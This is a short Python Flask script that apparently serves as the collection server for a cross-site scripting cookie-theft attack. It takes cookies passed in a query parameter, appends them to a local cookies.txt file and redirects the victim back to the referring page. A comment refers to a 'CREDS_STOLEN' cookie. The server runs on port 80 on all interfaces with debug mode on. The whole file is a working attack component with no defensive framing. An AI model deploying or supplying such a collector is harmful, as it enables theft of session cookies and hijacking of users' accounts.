from flask import Flask, request
from flask import redirect
from flask.ext.cors import CORS

app = Flask(__name__)
app.debug = True

CORS(app)

@app.route('/')
def index():

    cookies = request.args.get('cookies')
    with open('cookies.txt', 'a') as fd:
        fd.write(cookies)

    # craft an http response with CREDS_STOLEN cookie
    return redirect( request.referrer ) 

app.run(host='0.0.0.0', port=80)
